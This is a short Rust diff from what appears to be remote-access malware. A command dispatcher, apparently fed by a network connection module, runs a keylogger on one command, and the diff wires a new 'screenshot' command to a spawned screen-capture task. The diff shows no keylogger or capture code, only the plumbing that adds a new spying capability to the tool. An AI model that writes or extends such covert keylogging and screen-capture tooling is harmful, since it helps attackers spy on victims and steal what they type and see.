@@ -1,5 +1,6 @@
 mod connexion;
 mod input;
+mod screenshot;
 
 #[tokio::main]
 async fn main() {
@@ -13,7 +14,11 @@ async fn main() {
                             input::start_keylogger(120).await;
                         });
                     }
-                    "screenshot" => println!("Screenshot command reçue"),
+                    "screenshot" => {
+                        tokio::spawn(async {
+                            screenshot::take_screenshot().await;
+                        });
+                    },
                     _ => println!("Commande inconnue: {}", command),
                 }
             }
